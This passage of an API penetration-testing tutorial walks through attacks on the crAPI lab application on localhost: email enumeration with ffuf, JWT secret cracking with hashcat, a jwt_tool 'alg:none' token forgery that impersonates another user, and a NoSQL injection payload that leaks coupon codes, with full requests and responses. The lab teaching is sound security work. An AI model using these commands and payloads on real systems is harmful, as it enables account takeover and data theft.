<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Allow</span><span class="p">:</span> <span class="s">GET, HEAD, OPTIONS</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin, Cookie</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">454</span>

<span class="p">{</span><span class="w">
   </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="w">
   </span><span class="nl">"mechanic"</span><span class="p">:{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="w">
      </span><span class="nl">"mechanic_code"</span><span class="p">:</span><span class="s2">"TRAC_JME"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"user"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"james@example.com"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"number"</span><span class="p">:</span><span class="s2">""</span><span class="w">
      </span><span class="p">}</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"vehicle"</span><span class="p">:{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="w">
      </span><span class="nl">"vin"</span><span class="p">:</span><span class="s2">"2CORW83RZBD183647"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"owner"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"adam007@example.com"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"number"</span><span class="p">:</span><span class="s2">"9876895423"</span><span class="w">
      </span><span class="p">}</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"problem_details"</span><span class="p">:</span><span class="s2">"My car Mercedes-Benz - GLA Class is having issues.</span><span class="se">\n</span><span class="s2">Can you give me a call on my mobile 9876895423,</span><span class="se">\n</span><span class="s2">Or send me an email at adam007@example.com </span><span class="se">\n</span><span class="s2">Thanks,</span><span class="se">\n</span><span class="s2">Adam.</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"status"</span><span class="p">:</span><span class="s2">"Pending"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"created_on"</span><span class="p">:</span><span class="s2">"02 April, 2023, 15:03:08"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>An API with a correct behaviour, should reply with “Forbidden” or with an error message.</p><h3 id="broken-function-level-authorization-bfla"><span style="color: var(--link-color);">Broken Function Level Authorization (BFLA)</span></h3><p>Broken Function Level Authorization is a security vulnerability that occurs when an API or application fails to properly enforce access controls on a functional level. This can allow attackers to access or execute sensitive functions or operations that they are not authorized to access.</p><p>Function-level authorization refers to the practice of defining access controls at the level of individual functions or operations, such as specific actions within an application or API. This is in contrast to traditional role-based access control, which defines access controls at the level of groups or roles. An example of a Broken Function Level Authorization vulnerability in an API could be on a social media platform. Suppose you have a social media platform with an API that allows users to post and view content. The API requires users to authenticate with a username and password before accessing any functionality. However, the API does not properly enforce function-level authorization controls, and instead relies on client-side validation to prevent unauthorized access. This means that once a user is authenticated, they are free to view or modify any content, regardless of whether they are authorized to do so or not. An attacker could exploit this vulnerability by intercepting API requests and modifying the content ID in the request to view or modify content that they are not authorized to access. Since the API does not perform any additional checks to ensure that the user is authorized to view or modify the requested content, the attacker would be able to access or modify sensitive data that they are not authorized to access.</p><p>You can find these endpoints by fuzzing the API endpoints.</p><h2 id="authentication"><span style="color: var(--link-color);">Authentication</span></h2><p>An authentication vulnerability is a security vulnerability that allows attackers to bypass or exploit weaknesses in an application or system’s authentication mechanisms. Authentication is the process of verifying the identity of a user or system, typically through the use of passwords, tokens, or other authentication factors. To exploit this vulnerability, you should first discover the username and then the password. Or you can perform a bruteforce by using both username and password. Remember that the bruteforce could be dangerous.</p><p>You can use Burp Intruder as before. Or you can use also other tools, such as <a href="https://github.com/ffuf/ffuf">Ffuf</a> (Fuzz Faster U Fool). Ffuf isa versatile command-line tool for web application security testing and content discovery. It is designed to help testers automate the process of discovering hidden content and vulnerabilities on web servers and web applications. To use Ffuf, you can copy the request from Burp and paste in a file and then execute ffuf:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf <span class="nt">-request</span> req.txt <span class="nt">--request-proto</span> http <span class="nt">-w</span> wordlist <span class="nt">-mc</span> 200
</pre></table></code></div></div><p>The content of “req.txt” is:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/identity/api/auth/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">49</span>
<span class="na">sec-ch-ua</span><span class="p">:</span> <span class="s">" Not A;Brand";v="99", "Chromium";v="104"</span>
<span class="na">sec-ch-ua-mobile</span><span class="p">:</span> <span class="s">?0</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span>
<span class="na">sec-ch-ua-platform</span><span class="p">:</span> <span class="s">"Linux"</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://localhost:8888</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://localhost:8888/login</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

<span class="p">{</span><span class="nl">"email"</span><span class="p">:</span><span class="err">FUZZ</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"password"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>The wordlist that I used only to PoC for this article contains these email:</p><ul><li>test@test.com<li>notexist@test.com</ul><p>The result of ffuf will be:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>notexist@test.com       <span class="o">[</span>Status: 500, Size: 74, Words: 6, Lines: 1, Duration: 32ms]
<span class="nb">test</span>@test.com           <span class="o">[</span>Status: 401, Size: 54, Words: 2, Lines: 1, Duration: 111ms]
</pre></table></code></div></div><p>As we can see, the “notexist@test.com” gave us the HTTP code 500, instead the “test@test.com” gave us 401. This could be an hint to understand if an email exists. We can check by performing the request: With test@test.com:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> 
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 14:58:45 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Method</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Headers</span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store, max-age=0, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">0</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">DENY</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">54</span>

<span class="p">{</span><span class="nl">"token"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Invalid Credentials"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>With “not exist@test.com”:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">500</span> 
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 14:59:17 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Method</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Headers</span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store, max-age=0, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">0</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">DENY</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">74</span>

<span class="p">{</span><span class="nl">"token"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"Bearer"</span><span class="p">,</span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Given Email is not registered! "</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>So, we can confirm that the second one doesn’t exist, instead, the first one exists but the password is incorrect.</p><p>Of course, this is only an example. The responses depends from application to application. Some applications can reply always with 200, so it could be difficult to enumerate, other can reply with 500.</p><h4 id="tokens"><span style="color: var(--link-color);">Tokens</span></h4><p>In authentication, a token is a piece of data that is used to represent a user’s identity and authentication credentials. Tokens are commonly used in modern web applications and APIs as a way to authenticate users without requiring them to repeatedly enter their username and password. Tokens are typically issued by an authentication server or service when a user logs in or authenticates their identity. The token contains information such as the user’s identity, permissions, and expiration time, as well as a cryptographic signature to ensure its integrity and authenticity. Once a user has obtained a token, they can present it to the application or API to access protected resources or perform authenticated actions. The application or API can then verify the token’s authenticity and determine if the user is authorized to perform the requested action.</p><p>In the crAPI application, if we use the right credentials, we obtain the following response:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> 
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 15:18:53 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Method</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Headers</span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store, max-age=0, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">0</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">DENY</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">502</span>

<span class="p">{</span><span class="w">
   </span><span class="nl">"token"</span><span class="p">:</span><span class="s2">"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODA5NjcxMzMsImV4cCI6MTY4MTU3MTkzM30.f5ioU6jjVH7Ny_mSE89dC6mkWxzJUSgrFjjp37ej9i0CxKJgNpkArPVf2VX7kMi0U4DcZzlANbvyr8CdRUUa7GvqppiMLTQg-c_mCfWRPdkD6Mgsm098CxOTkCCkiA_Ez_ZSfvG-gKsV43vsSiWSy8TgkbPgzUm7txglStZuclOPLz5QQqbgkdMmB-Ivno8dTLzdE1xqJ88G2QmkNJLn47uW8VZ5zSVZ080N39aHYysrcCdrQ4HAFSw_OKpkCuq-7oNZIryoLMiwUWCJJbqSqMYocBVMFwN1YqlfYjUp2Z04ionV-gfmYOaoduKKdFvP9iLqES5Jst64tHuA-DT8Mw"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"Bearer"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"message"</span><span class="p">:</span><span class="kc">null</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This response contains a token and it will be used in all the next requests. This token is a JWT token that is commonly used. But sometime the used token can also be generated from the developers and could be weak. To analyze the token, we can use the Burp Sequencer that make a tons of requests and then analyze the entropy of every characters to undestand if there is some common characters on some position of the token is pseudo-random. To use the Burp Sequencer, send to it the login request and then select the token to analyze.</p><h4 id="jwt-token"><span style="color: var(--link-color);">JWT Token</span></h4><p>JWT stands for JSON Web Token, which is a standard for securely transmitting information as a JSON object between parties over the internet. A JWT is a type of token that is used in authentication and authorization processes.</p><p>A JWT consists of three parts: a header, a payload, and a signature. The header describes the algorithm used to generate the signature, the payload contains the information being transmitted, and the signature is a string generated by signing the header and payload with a secret key. The payload of a JWT typically contains information about the user, such as their username, role, and permissions. The signature ensures that the payload has not been tampered with and that the token was issued by a trusted source.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/jwt_token.png" alt="JWT Token" /></p><p>Indeed, if we check the token with <a href="https://jwt.io/">jwt.io</a>, we can see the information inside the token: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/jwt_token_decoded.png" alt="JWT Token" /></p><p>For the JWT token, some vulnerabilities are known. One of this is a weak key used for the signature. To crack this, you can use hashcat:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 16500 &lt;JWT_TOKEN&gt; &lt;WORDLIST&gt;
</pre></table></code></div></div><p>Or you can use another tool, <a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>. For the analysis (like using jwt.io), you can use the following command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>jwt_tool &lt;TOKEN&gt;
</pre></table></code></div></div><p>And, also, you can perform several attacks by using the following command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>jwt_tool <span class="nt">-t</span> URL <span class="nt">-rh</span> <span class="s1">'Authorization: Bearer TOKEN'</span> <span class="nt">-M</span> at
</pre></table></code></div></div><p>In the case of the crAPI application, we get the jwt_token from Burp request and put in the command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>jwt_tool <span class="nt">-t</span> http://localhost:8888/identity/api/v2/user/dashboard <span class="nt">-rh</span> <span class="s1">'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODEwMzQwMDcsImV4cCI6MTY4MTYzODgwN30.sHarqn3O1wx3QpUsymoOev1NtkMUgc08FFLE96scPWyLS8RMqL6MpH9KdDeekbIDqkf4KEH10iLGid_MVo5XA113G3lhvxZZkObW6lzErBrMOsdjfgU9WTBICdmhJk2_GG7EJmCXxpFKx1_n83OjcZZxzmH3dzIQiWRTBMBPrfouNgEuYDuT9hjoIzlAsIrvP2QKsBGbl-tn3F3nOd6pra2LsoW1RB4HvkzqjKOUdb6vVmMxc78s-2XnTRL11wpYAoN8khkQuLQKmt000iwIlH289mThcapjJKrZZNzFz3JrYgEzOMbOU_oNpZKfWzNmdBAXpkSsMEIsLVOfHZiLNg'</span> <span class="nt">-M</span> at <span class="nt">-cv</span> <span class="s2">"Test"</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">-cv "Test"</code> is to define what should be contained in a successuful response. Since we use the endpoint that contains the user’s information, we said to jwt_tool that a successful response should contain the name of the user, in this case I created a user called “Test” (a lot of imagination :D ).</p><p>The tool will generate a tons of request and it will try different attacks. If we have Burp in background, we can see the requests, for instance, it will found a successfull the following request:</p><p>jwttool_5a12251d49009ecf554c78cd07ef944d Exploit: “alg”:”none” (-X a) Response Code: 200, 179 bytes</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/identity/api/v2/user/dashboard</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">User-agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool jwttool_5a12251d49009ecf554c78cd07ef944d</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODEwMzQwMDcsImV4cCI6MTY4MTYzODgwN30.</span>
</pre></table></code></div></div><p>You can notice that the jwt token is changed and if we see the decoded with the Burp extension “JSON Web Token” <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/jwt_tool_noneAlg.png" alt="JWT Token None Algorithm" /></p><p>This attack remove the signature from the JWT Token and the application, if doesn’t check the signature, will accept it. So, with this attack, you can change the payload by inserting the email of another user and you will login as that user. In the crAPI, we can change the user in this way:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/jwt_token2_otheruser.png" alt="JWT Token With other user" /></p><p>The request will be:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/identity/api/v2/user/dashboard</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">User-agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool jwttool_5a12251d49009ecf554c78cd07ef944d</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0MkB0ZXN0LmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgxMDM0MDA3LCJleHAiOjE2ODE2Mzg4MDd9.</span>
</pre></table></code></div></div><p>And the response:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> 
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 09 Apr 2023 10:41:27 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Method</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Access-Control-Request-Headers</span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store, max-age=0, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">0</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">DENY</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">185</span>

<span class="p">{</span><span class="w">
   </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">9</span><span class="p">,</span><span class="w">
   </span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"test test"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"test2@test.com"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"number"</span><span class="p">:</span><span class="s2">"0123456783"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"picture_url"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="w">
   </span><span class="nl">"video_url"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="w">
   </span><span class="nl">"video_name"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="w">
   </span><span class="nl">"available_credit"</span><span class="p">:</span><span class="mf">100.0</span><span class="p">,</span><span class="w">
   </span><span class="nl">"video_id"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="w">
   </span><span class="nl">"role"</span><span class="p">:</span><span class="s2">"ROLE_USER"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>We have the information of the other user.</p><p>This command generates a lot of requests. Again, be aware of the environment that you test.</p><h2 id="injection"><span style="color: var(--link-color);">Injection</span></h2><p>SQL injection is a type of security vulnerability that occurs when an attacker injects malicious SQL code into an application’s input field, such as a login form, search bar, or contact form. The malicious code can then be executed by the application’s database, potentially giving the attacker unauthorized access to sensitive data or enabling them to modify or delete data. SQL injection attacks can be particularly dangerous because they can allow attackers to bypass authentication mechanisms and gain access to confidential data such as usernames, passwords, credit card details, and other sensitive information. Attackers can also use SQL injection to modify or delete data from a database, which can cause data loss or damage to the application’s functionality.</p><p>Fuzzing for SQL injection involves sending various malicious input data to an application to see if it can be exploited to perform SQL injection attacks. It is possible to fuzz for SQL injection by using also The Burp Suite Intruder. Burp includes already a wordlist containing SQL injection payload. After the attack is ended, you can check if the responses contain error related to SQL queries.</p><p>The NOSQL injection is part of this vulnerability category. NoSQL injection is a type of injection attack that targets NoSQL databases. NoSQL databases differ from traditional relational databases in that they store data in non-tabular, document-based structures. These databases often use JavaScript Object Notation (JSON), Extensible Markup Language (XML), or similar formats to represent data. NoSQL injection attacks are similar to SQL injection attacks, but they target NoSQL databases rather than SQL databases. In a NoSQL injection attack, an attacker injects malicious code into a NoSQL query in order to modify or extract data from the database. The attack can be used to bypass authentication, elevate privileges, or gain access to sensitive data.</p><p>In crAPI, we can found the NOSQLi in “coupon redeem” functionality. To find the right payload, we can use Burp Intruder. First we set the position:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/nosqli_1.png" alt="NOSQLi Burp Intruder" /></p><p>And then we select the wordlist that we want use in the “Payload” tab of Burp Intruder, in this case I used NoSQL.txt wordlist of SecLists.</p><p>After some seconds, we can see the requests and we got 200 with the payload <code class="language-plaintext highlighter-rouge">{"gt": ""}</code>: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/nosqli_2.png" alt="NOSQLi Burp Intruder" /></p><p>The request will be:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Content-Length: 27
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODEwMzQwMDcsImV4cCI6MTY4MTYzODgwN30.sHarqn3O1wx3QpUsymoOev1NtkMUgc08FFLE96scPWyLS8RMqL6MpH9KdDeekbIDqkf4KEH10iLGid_MVo5XA113G3lhvxZZkObW6lzErBrMOsdjfgU9WTBICdmhJk2_GG7EJmCXxpFKx1_n83OjcZZxzmH3dzIQiWRTBMBPrfouNgEuYDuT9hjoIzlAsIrvP2QKsBGbl-tn3F3nOd6pra2LsoW1RB4HvkzqjKOUdb6vVmMxc78s-2XnTRL11wpYAoN8khkQuLQKmt000iwIlH289mThcapjJKrZZNzFz3JrYgEzOMbOU_oNpZKfWzNmdBAXpkSsMEIsLVOfHZiLNg
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept: */*
Origin: http://localhost:8888
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8888/shop
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"coupon_code":{"$gt": ""}}
</pre></table></code></div></div><p>With the reponse:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Server: openresty/1.17.8.2
Date: Sun, 09 Apr 2023 11:28:47 GMT
Content-Type: application/json
Connection: close
Access-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Origin: *
Content-Length: 79

{
   "coupon_code":"TRAC075",
   "amount":"75",
   "CreatedAt":"2023-04-02T15:00:39.778Z"
}
